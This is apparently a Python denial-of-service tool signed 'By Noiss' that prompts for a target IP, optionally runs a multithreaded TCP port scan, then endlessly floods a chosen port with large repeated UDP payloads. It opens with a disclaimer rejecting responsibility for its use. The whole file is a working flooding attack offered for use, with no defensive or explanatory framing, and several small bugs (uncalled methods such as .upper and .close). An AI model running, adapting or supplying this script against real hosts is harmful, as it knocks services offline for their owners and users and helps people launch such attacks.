


import socket, threading, os, sys, random, ctypes, time, math
delay=20
psc=5000
ux=3
port = 1
sent = 0
id=1
svc=[]
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
if os.name=='nt':
    os.system('color c')
else:
    os.system('setterm -background white -foreground white -store')

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
cls()

def type(text):
  words = text
  for char in words:
    time.sleep(0.01)
    sys.stdout.write(char)
    sys.stdout.flush()
    
print(r'                    __  __')
print(r'   ____             \ \/ /')
print(r'  / __/______ ____   \  / ')
print(r' / _// __/ _ `(_-<   /  \ ')
print("/___/_/  \_,_/___/  /_/\\_\\")
print('By Noiss\n')

print("Me,as the creator of this script I don't take any responsibility for anything you do with this script.")
input("Press Enter to accept...\n")


type("││ target ip")
print()
ip = input("││ :")
ipp=ip
target=ip
type("││ scan for ports or not? (y,n)")
print()
scanop = input("││ :")


if len(sys.argv) == 2:
    target = socket.gethostbyname(sys.argv[1])


def TCP_connect(ipp, port_number, delay, output):
    TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPsock.settimeout(delay)
    try:
        TCPsock.connect((ipp, port_number))
        output[port_number] = 'Listening'
    except:
        output[port_number] = ''

def scan_ports(ipp, delay):

    threads = []
    output = {}


    for i in range(psc):
        t = threading.Thread(target=TCP_connect, args=(ipp, i, delay, output))
        threads.append(t)


    for i in range(psc):
        threads[i].start()


    for i in range(psc):
        threads[i].join()

    for i in range(psc):
        if output[i] == 'Listening':
            svc.append(int(i))


def main():
    type("││ timeout seconds (20 recommended)")
    print()
    delay = int(input("││ :"))
    type("││ port scan precision (3 recommended)")
    print()
    ux = int(input("││ :"))
    type("││ port scan interval (5000 recommended,65535 max)")
    print()
    psc=int(input("││ :"))

    type("││ scanning for around ")
    print(delay*ux+(psc*0.002),end=" ")
    type("seconds")
    print()
    for kk in range(ux):
        scan_ports(ipp, delay)
        type("││ Phase ")
        print(str(kk+1),end="")
        type(" complete")
        print()
    type("││ open ports=")
    res = [*set(svc)]
    print(res)

if __name__ == "__main__" and scanop=="y" or scanop=="Y" or scanop=="yes" or scanop=="YES" or scanop=="Yes":
    main()

type("││ choose port")
print()

open=int(input("││ :"))

type("|| enter message(or just random symbols)")
print()
type("|| example:420=☻ or qwerty0123456789~!@#$%^&*()+=`;?.,<>\|{}[]")
print()
LI=input("││ :")

type("|| shuffle text or not? (y,n)")
print()
shuffopinion=(input("││ :"))

type("││ package multiplier(maximum 1056)")
print()
threads=int(input("││ :"))
if threads>1056:
    #sys.exit("multiplier bigger than 1056")
    threads=1056
c=(sent+int(threads/100)*100.44)/500
sentstring=round(sent,1)


def convert_size(size_bytes):
   if size_bytes == 0:
       return "0B"
   size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
   i = int(math.floor(math.log(size_bytes, 1024)))
   p = math.pow(1024, i)
   s = round(size_bytes / p, 2)
   return "%s %s" % (s, size_name[i])
realsiz=convert_size(len(((LI*threads)*100).encode('utf-16')))

if os.name=='nt':
    print("││ check task manager ││")
else:
    print("││ check the traffic ││")


Target=ipp
Port=int(open)
Protocol="udp"
mult=threads
Data=LI

Adr=(Target,Port)

while True:
    
    if shuffopinion.upper == "Y" or shuffopinion.upper == "YES" or shuffopinion.upper == "SHUFFLE":
        str_var = list(LI)
        random.shuffle(str_var)
        Data=''.join(str_var)
    
    if Protocol =='TCP' or Protocol == 'tcp' or Protocol == 'Tcp' or Protocol == 't':
        Sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    elif Protocol =='UDP' or Protocol == 'udp' or Protocol == 'Udp' or Protocol == 'u':
        Sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    Sock.connect(Adr)
    Bytes=(Data*mult)
    BytesEnc=str.encode(Bytes)
    for i in range(120):
        Sock.sendall(BytesEnc)

    print('|| Sent message "{0}" * {1} to {2} in port {3} '.format(Data,threads*10,Target, Port, ))
    if socket.error:
        Sock.shutdown(socket.SHUT_RDWR)
        Sock.close
        del Sock

